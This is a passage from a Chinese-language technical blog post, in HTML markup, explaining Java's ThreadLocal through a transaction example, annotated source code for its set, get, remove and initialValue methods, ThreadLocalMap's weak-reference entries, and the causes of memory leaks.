class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">transfer</span><span class="params">(String outUser, String inUser, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">        AccountDao ad = <span class="keyword">new</span> AccountDao();   </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">                Connection conn = JdbcUtils.getConnection();</span><br><span class="line">                <span class="comment">//开启事务</span></span><br><span class="line">                conn.setAutoCommit(<span class="keyword">false</span>);</span><br><span class="line">                <span class="comment">// 转出 ： 这里不需要传参了 ！</span></span><br><span class="line">                ad.out(outUser, money);</span><br><span class="line">                <span class="comment">// 模拟转账过程中的异常</span></span><br><span class="line">                <span class="comment">// int i = 1 / 0;</span></span><br><span class="line">                <span class="comment">// 转入</span></span><br><span class="line">                ad.in(inUser, money);</span><br><span class="line">                <span class="comment">//事务提交</span></span><br><span class="line">                JdbcUtils.commitAndClose();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="comment">//事务回滚</span></span><br><span class="line">                JdbcUtils.rollbackAndClose();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AccountDao类的修改：照常使用</p><h3 id="ThreadLocal方案的好处"><a href="#ThreadLocal方案的好处" class="headerlink" title="ThreadLocal方案的好处"></a>ThreadLocal方案的好处</h3><p>从上述的案例中我们可以看到， 在一些特定场景下，ThreadLocal方案有两个突出的优势：</p><ol><li>传递数据 ： 保存每个线程绑定的数据，在需要的地方可以直接获取, 避免参数直接传递带来的代码耦合问题</li><li>线程隔离 ： 各线程之间的数据相互隔离却又具备并发性，避免同步方式带来的性能损失</li></ol><h1 id="ThreadLocal的内部结构"><a href="#ThreadLocal的内部结构" class="headerlink" title="ThreadLocal的内部结构"></a>ThreadLocal的内部结构</h1><p>通过以上的学习，我们对ThreadLocal的作用有了一定的认识。现在我们一起来看一下ThreadLocal的内部结构，探究它能够实现线程数据隔离的原理。</p><h2 id="常见的误解"><a href="#常见的误解" class="headerlink" title="常见的误解"></a>常见的误解</h2><p>如果我们不去看源代码的话，可能会猜测ThreadLocal是这样子设计的：每个ThreadLocal都创建一个Map，然后用线程作为Map的key，要存储的局部变量作为Map的value，这样就能达到各个线程的局部变量隔离的效果。这是最简单的设计方法，JDK最早期的ThreadLocal 确实是这样设计的，但现在早已不是了。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615005945.png" alt="image-20210614235928629"></p><h2 id="现在的设计"><a href="#现在的设计" class="headerlink" title="现在的设计"></a>现在的设计</h2><p>但是，JDK后面优化了设计方案，在JDK8中 ThreadLocal的设计是：每个Thread维护一个ThreadLocalMap，这个Map的key是ThreadLocal实例本身，value才是真正要存储的值Object。</p><p>具体的过程是这样的：</p><ul><li>每个Thread线程内部都有一个Map (ThreadLocalMap)</li><li>Map里面存储ThreadLocal对象（key）和线程的变量副本（value）</li><li>Thread内部的Map是由ThreadLocal维护的，由ThreadLocal负责向map获取和设置线程的变量值。</li><li>对于不同的线程，每次获取副本值时，别的线程并不能获取到当前线程的副本值，形成了副本的隔离，互不干扰。</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615005942.png" alt="image-20210615000018945"></p><h2 id="这样设计的好处"><a href="#这样设计的好处" class="headerlink" title="这样设计的好处"></a>这样设计的好处</h2><p>这个设计与我们一开始说的设计刚好相反，这样设计有如下两个优势：</p><ul><li>这样设计之后每个Map存储的Entry数量就会变少。因为之前的存储数量由Thread的数量决定，现在是由ThreadLocal的数量决定。在实际运用当中，往往ThreadLocal的数量要少于Thread的数量。</li><li>当Thread销毁之后，对应的ThreadLocalMap也会随之销毁，能减少内存的使用。</li></ul><h1 id="ThreadLocal的核心方法源码"><a href="#ThreadLocal的核心方法源码" class="headerlink" title="ThreadLocal的核心方法源码"></a>ThreadLocal的核心方法源码</h1><p>基于ThreadLocal的内部结构，我们继续分析它的核心方法源码，更深入的了解其操作原理。</p><p>除了构造方法之外， ThreadLocal对外暴露的方法有以下4个：</p><table><thead><tr><th><strong>方法声明</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>protected T initialValue()</td><td>返回当前线程局部变量的初始值</td></tr><tr><td>public void set( T value)</td><td>设置当前线程绑定的局部变量</td></tr><tr><td>public T get()</td><td>获取当前线程绑定的局部变量</td></tr><tr><td>public void remove()</td><td>移除当前线程绑定的局部变量</td></tr></tbody></table><p>以下是这4个方法的详细源码分析(为了保证思路清晰, ThreadLocalMap部分暂时不展开,下一个知识点详解)</p><h2 id="set方法"><a href="#set方法" class="headerlink" title="set方法"></a>set方法</h2><p>源码和对应的中文注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 设置当前线程对应的ThreadLocal的值</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> value 将要保存在当前线程对应的ThreadLocal的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取当前线程对象</span></span><br><span class="line">    Thread t = Thread.currentThread();</span><br><span class="line">    <span class="comment">// 获取此线程对象中维护的ThreadLocalMap对象</span></span><br><span class="line">    ThreadLocalMap map = getMap(t);</span><br><span class="line">    <span class="comment">// 判断map是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (map != <span class="keyword">null</span>)</span><br><span class="line">        <span class="comment">// 存在则调用map.set设置此实体entry</span></span><br><span class="line">        map.set(<span class="keyword">this</span>, value);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// 1）当前线程Thread 不存在ThreadLocalMap对象</span></span><br><span class="line">        <span class="comment">// 2）则调用createMap进行ThreadLocalMap对象的初始化</span></span><br><span class="line">        <span class="comment">// 3）并将 t(当前线程)和value(t对应的值)作为第一个entry存放至ThreadLocalMap中</span></span><br><span class="line">        createMap(t, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取当前线程Thread对应维护的ThreadLocalMap </span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  t the current thread 当前线程</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the map 对应维护的ThreadLocalMap </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ThreadLocalMap <span class="title">getMap</span><span class="params">(Thread t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> t.threadLocals;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     *创建当前线程Thread对应维护的ThreadLocalMap </span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> t 当前线程</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> firstValue 存放到map中第一个entry的值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createMap</span><span class="params">(Thread t, T firstValue)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//这里的this是调用此方法的threadLocal</span></span><br><span class="line">        t.threadLocals = <span class="keyword">new</span> ThreadLocalMap(<span class="keyword">this</span>, firstValue);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代码执行流程</p><p> A. 首先获取当前线程，并根据当前线程获取一个Map</p><p> B. 如果获取的Map不为空，则将参数设置到Map中（当前ThreadLocal的引用作为key）</p><p> C. 如果Map为空，则给该线程创建 Map，并设置初始值</p><h2 id="get方法"><a href="#get方法" class="headerlink" title="get方法"></a>get方法</h2><p>源码和对应的中文注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回当前线程中保存ThreadLocal的值</span></span><br><span class="line"><span class="comment"> * 如果当前线程没有此ThreadLocal变量，</span></span><br><span class="line"><span class="comment"> * 则它会通过调用&#123;<span class="doctag">@link</span> #initialValue&#125; 方法进行初始化值</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回当前线程对应此ThreadLocal的值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> T <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取当前线程对象</span></span><br><span class="line">    Thread t = Thread.currentThread();</span><br><span class="line">    <span class="comment">// 获取此线程对象中维护的ThreadLocalMap对象</span></span><br><span class="line">    ThreadLocalMap map = getMap(t);</span><br><span class="line">    <span class="comment">// 如果此map存在</span></span><br><span class="line">    <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 以当前的ThreadLocal 为 key，调用getEntry获取对应的存储实体e</span></span><br><span class="line">        ThreadLocalMap.Entry e = map.getEntry(<span class="keyword">this</span>);</span><br><span class="line">        <span class="comment">// 对e进行判空 </span></span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">            <span class="comment">// 获取存储实体 e 对应的 value值</span></span><br><span class="line">            <span class="comment">// 即为我们想要的当前线程对应此ThreadLocal的值</span></span><br><span class="line">            T result = (T)e.value;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    初始化 : 有两种情况有执行当前代码</span></span><br><span class="line"><span class="comment">    第一种情况: map不存在，表示此线程没有维护的ThreadLocalMap对象</span></span><br><span class="line"><span class="comment">    第二种情况: map存在, 但是没有与当前ThreadLocal关联的entry</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> setInitialValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the initial value 初始化后的值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> T <span class="title">setInitialValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用initialValue获取初始化的值</span></span><br><span class="line">    <span class="comment">// 此方法可以被子类重写, 如果不重写默认返回null</span></span><br><span class="line">    T value = initialValue();</span><br><span class="line">    <span class="comment">// 获取当前线程对象</span></span><br><span class="line">    Thread t = Thread.currentThread();</span><br><span class="line">    <span class="comment">// 获取此线程对象中维护的ThreadLocalMap对象</span></span><br><span class="line">    ThreadLocalMap map = getMap(t);</span><br><span class="line">    <span class="comment">// 判断map是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (map != <span class="keyword">null</span>)</span><br><span class="line">        <span class="comment">// 存在则调用map.set设置此实体entry</span></span><br><span class="line">        map.set(<span class="keyword">this</span>, value);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// 1）当前线程Thread 不存在ThreadLocalMap对象</span></span><br><span class="line">        <span class="comment">// 2）则调用createMap进行ThreadLocalMap对象的初始化</span></span><br><span class="line">        <span class="comment">// 3）并将 t(当前线程)和value(t对应的值)作为第一个entry存放至ThreadLocalMap中</span></span><br><span class="line">        createMap(t, value);</span><br><span class="line">    <span class="comment">// 返回设置的值value</span></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码执行流程 </p><p>A. 首先获取当前线程, 根据当前线程获取一个Map</p><p>B. 如果获取的Map不为空，则在Map中以ThreadLocal的引用作为key来在Map中获取对应的Entry e，否则转到D</p><p>C. 如果e不为null，则返回e.value，否则转到D</p><p>D. Map为空或者e为空，则通过initialValue函数获取初始值value，然后用ThreadLocal的引用和value作为firstKey和firstValue创建一个新的Map</p><p>总结: 先获取当前线程的 ThreadLocalMap 变量，如果存在则返回值，不存在则创建并返回初始值。</p><h2 id="remove方法"><a href="#remove方法" class="headerlink" title="remove方法"></a>remove方法</h2><p>源码和对应的中文注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 删除当前线程中保存的ThreadLocal对应的实体entry</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="comment">// 获取当前线程对象中维护的ThreadLocalMap对象</span></span><br><span class="line">        ThreadLocalMap m = getMap(Thread.currentThread());</span><br><span class="line">       <span class="comment">// 如果此map存在</span></span><br><span class="line">        <span class="keyword">if</span> (m != <span class="keyword">null</span>)</span><br><span class="line">           <span class="comment">// 存在则调用map.remove</span></span><br><span class="line">           <span class="comment">// 以当前ThreadLocal为key删除对应的实体entry</span></span><br><span class="line">            m.remove(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代码执行流程</p><p> A. 首先获取当前线程，并根据当前线程获取一个Map</p><p> B. 如果获取的Map不为空，则移除当前ThreadLocal对象对应的entry</p><h2 id="initialValue方法"><a href="#initialValue方法" class="headerlink" title="initialValue方法"></a>initialValue方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  * 返回当前线程对应的ThreadLocal的初始值</span></span><br><span class="line"><span class="comment">  * 此方法的第一次调用发生在，当线程通过get方法访问此线程的ThreadLocal值时</span></span><br><span class="line"><span class="comment">  * 除非线程先调用了set方法，在这种情况下，initialValue 才不会被这个线程调用。</span></span><br><span class="line"><span class="comment">  * 通常情况下，每个线程最多调用一次这个方法。</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;这个方法仅仅简单的返回null &#123;<span class="doctag">@code</span> null&#125;;</span></span><br><span class="line"><span class="comment">  * 如果程序员想ThreadLocal线程局部变量有一个除null以外的初始值，</span></span><br><span class="line"><span class="comment">  * 必须通过子类继承&#123;<span class="doctag">@code</span> ThreadLocal&#125; 的方式去重写此方法</span></span><br><span class="line"><span class="comment">  * 通常, 可以通过匿名内部类的方式实现</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span> 当前ThreadLocal的初始值</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> T <span class="title">initialValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此方法的作用是 返回该线程局部变量的初始值。</p><ol><li>这个方法是一个延迟调用方法，从上面的代码我们得知，在set方法还未调用而先调用了get方法时才执行，并且仅执行1次。</li><li>这个方法缺省实现直接返回一个null。</li><li>如果想要一个除null之外的初始值，可以重写此方法。（备注： 该方法是一个protected的方法，显然是为了让子类覆盖而设计的）</li></ol><h1 id="ThreadLocalMap源码分析"><a href="#ThreadLocalMap源码分析" class="headerlink" title="ThreadLocalMap源码分析"></a>ThreadLocalMap源码分析</h1><p>在分析ThreadLocal方法的时候，我们了解到ThreadLocal的操作实际上是围绕ThreadLocalMap展开的。ThreadLocalMap的源码相对比较复杂, 我们从以下三个方面进行讨论。</p><h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h2><p> ThreadLocalMap是ThreadLocal的内部类，没有实现Map接口，用独立的方式实现了Map的功能，其内部的Entry也是独立实现。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615005936.png" alt="image-20210615002054043"></p><p>成员变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始容量 —— 必须是2的整次幂</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INITIAL_CAPACITY = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 存放数据的table，Entry类的定义在下面分析</span></span><br><span class="line"><span class="comment"> * 同样，数组长度必须是2的整次幂。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Entry[] table;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数组里面entrys的个数，可以用于判断table当前使用量是否超过阈值。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 进行扩容的阈值，表使用量大于它的时候进行扩容。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> threshold; <span class="comment">// Default to 0</span></span><br></pre></td></tr></table></figure><p> 跟HashMap类似，INITIAL_CAPACITY代表这个Map的初始容量；table 是一个Entry 类型的数组，用于存储数据；size 代表表中的存储数目； threshold 代表需要扩容时对应 size 的阈值。</p><p>存储结构 - Entry</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Entry继承WeakReference，并且用ThreadLocal作为key.</span></span><br><span class="line"><span class="comment"> * 如果key为null(entry.get() == null)，意味着key不再被引用，</span></span><br><span class="line"><span class="comment"> * 因此这时候entry也可以从table中清除。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span> <span class="keyword">extends</span> <span class="title">WeakReference</span>&lt;<span class="title">ThreadLocal</span>&lt;?&gt;&gt; </span>&#123;</span><br><span class="line">   <span class="comment">/** The value associated with this ThreadLocal. */</span></span><br><span class="line">   Object value;</span><br><span class="line"></span><br><span class="line">   Entry(ThreadLocal&lt;?&gt; k, Object v) &#123;</span><br><span class="line">       <span class="keyword">super</span>(k);</span><br><span class="line">       value = v;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ThreadLocalMap中，也是用Entry来保存K-V结构数据的。不过Entry中的key只能是ThreadLocal对象，这点在构造方法中已经限定死了。</p><p>另外，Entry继承WeakReference，也就是key（ThreadLocal）是弱引用，其目的是将ThreadLocal对象的生命周期和线程生命周期解绑。</p><h2 id="弱引用和内存泄漏"><a href="#弱引用和内存泄漏" class="headerlink" title="弱引用和内存泄漏"></a>弱引用和内存泄漏</h2><p>有些程序员在使用ThreadLocal的过程中会发现有内存泄漏的情况发生，就猜测这个内存泄漏跟Entry中使用了弱引用的key有关系。这个理解其实是不对的。</p><p>我们先来回顾这个问题中涉及的几个名词概念，再来分析问题。</p><p><strong>内存泄漏相关概念</strong></p><ol><li>Memory overflow:内存溢出，没有足够的内存提供申请者使用。</li><li>Memory leak: 内存泄漏是指程序中已动态分配的堆内存由于某种原因程序未释放或无法释放，造成系统内存的浪费，导致程序运行速度减慢甚至系统崩溃等严重后果。内存泄漏的堆积终将导致内存溢出。</li></ol><p><strong>弱引用相关概念</strong></p><p> Java中的引用有4种类型： 强、软、弱、虚。当前这个问题主要涉及到强引用和弱引用：</p><p> <strong>强引用</strong>（“Strong” Reference），就是我们最常见的普通对象引用，只要还有强引用指向一个对象，就能表明对象还“活着”，垃圾回收器就不会回收这种对象。</p><p> <strong>弱引用</strong>（WeakReference），垃圾回收器一旦发现了只具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。</p><p><strong>如果key使用强引用</strong></p><p> 假设ThreadLocalMap中的key使用了强引用，那么会出现内存泄漏吗？</p><p> 此时ThreadLocal的内存图（实线表示强引用）如下：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615005929.png" alt="image-20210615003439779"></p><p> 假设在业务代码中使用完ThreadLocal ，threadLocal Ref被回收了。</p><p> 但是因为threadLocalMap的Entry强引用了threadLocal，造成threadLocal无法被回收。</p><p> 在没有手动删除这个Entry以及CurrentThread依然运行的前提下，始终有强引用链 threadRef-&gt;currentThread-&gt;threadLocalMap-&gt;entry，Entry就不会被回收（Entry中包括了ThreadLocal实例和value），导致Entry内存泄漏。</p><p> 也就是说，ThreadLocalMap中的key使用了强引用， 是无法完全避免内存泄漏的。</p><p><strong>如果key使用弱引用</strong></p><p>那么ThreadLocalMap中的key使用了弱引用，会出现内存泄漏吗？</p><p>此时ThreadLocal的内存图（实线表示强引用，虚线表示弱引用）如下：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615005927.png" alt="image-20210615003612557"></p><p>同样假设在业务代码中使用完ThreadLocal ，threadLocal Ref被回收了。</p><p>由于ThreadLocalMap只持有ThreadLocal的弱引用，没有任何强引用指向threadlocal实例, 所以threadlocal就可以顺利被gc回收，此时Entry中的key=null。</p><p>但是在没有手动删除这个Entry以及CurrentThread依然运行的前提下，也存在有强引用链 threadRef-&gt;currentThread-&gt;threadLocalMap-&gt;entry -&gt; value ，value不会被回收， 而这块value永远不会被访问到了，导致value内存泄漏。</p><p>也就是说，ThreadLocalMap中的key使用了弱引用， 也有可能内存泄漏。</p><p><strong>出现内存泄漏的真实原因</strong></p><p>比较以上两种情况，我们就会发现，内存泄漏的发生跟ThreadLocalMap中的key是否使用弱引用是没有关系的。那么内存泄漏的的真正原因是什么呢？</p><p>细心的同学会发现，在以上两种内存泄漏的情况中，都有两个前提：</p><blockquote><p>没有手动删除这个Entry<br>CurrentThread依然运行</p></blockquote><p>第一点很好理解，只要在使用完ThreadLocal，调用其remove方法删除对应的Entry，就能避免内存泄漏。</p><p>第二点稍微复杂一点， 由于ThreadLocalMap是Thread的一个属性，被当前线程所引用，所以它的生命周期跟Thread一样长。那么在使用完ThreadLocal之后，如果当前Thread也随之执行结束，ThreadLocalMap自然也会被gc回收，从根源上避免了内存泄漏。</p><p>综上，ThreadLocal内存泄漏的根源是：由于ThreadLocalMap的生命周期跟Thread一样长，如果没有手动删除对应key就会导致内存泄漏。</p><p><strong>为什么使用弱引用</strong></p><p>根据刚才的分析, 我们知道了： 无论ThreadLocalMap中的key使用哪种类型引用都无法完全避免内存泄漏，跟使用弱引用没有关系。</p><p>要避免内存泄漏有两种方式：</p><ol><li><p>使用完ThreadLocal，调用其remove方法删除对应的Entry</p></li><li><p>使用完ThreadLocal，当前Thread也随之运行结束</p></li></ol><p><strong>相对第一种方式，第二种方式显然更不好控制，特别是使用线程池的时候，线程结束是不会销毁的。</strong></p><p>也就是说，只要记得在使用完ThreadLocal及时的调用remove，无论key是强引用还是弱引用都不会有问题。那么为什么key要用弱引用呢？</p><p>事实上，在ThreadLocalMap中的set/getEntry方法中，会对key为null（也即是ThreadLocal为null）进行判断，如果为null的话，那么是会对value置为null的。</p><p>这就意味着使用完ThreadLocal，CurrentThread依然运行的前提下，就算忘记调用remove方法，弱引用比强引用可以多一层保障：弱引用的ThreadLocal会被回收，对应的value在下一次ThreadLocalMap调用set,get,remove中的任一方法的时候会被清除，从而避免内存泄漏。</p><h2 id="hash冲突的解决"><a href="#hash冲突的解决" class="headerlink" title="hash冲突的解决"></a>hash冲突的解决</h2><p> hash冲突的解决是Map中的一个重要内容。我们以hash冲突的解决为线索，来研究一下ThreadLocalMap的核心源码。</p><p>首先从ThreadLocal的set() 方法入手</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T value)</span> </span>&#123;</span><br><span class="line">    Thread t = Thread.currentThread();</span><br><span class="line">    ThreadLocal.ThreadLocalMap map = getMap(t);</span><br><span class="line">    <span class="keyword">if</span> (map != <span class="keyword">null</span>)</span><br><span class="line">        <span class="comment">//调用了ThreadLocalMap的set方法</span></span><br><span class="line">        map.set(<span class="keyword">this</span>, value);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        createMap(t, value);</span><br><span class="line">&#125;</span><br><span class="line">ThreadLocal.<span class="function">ThreadLocalMap <span class="title">getMap</span><span class="params">(Thread t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> t.threadLocals;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createMap</span><span class="params">(Thread t, T firstValue)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//调用了ThreadLocalMap的构造方法</span></span><br><span class="line">    t.threadLocals = <span class="keyword">new</span> ThreadLocal.ThreadLocalMap(<span class="keyword">this</span>, firstValue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法我们刚才分析过, 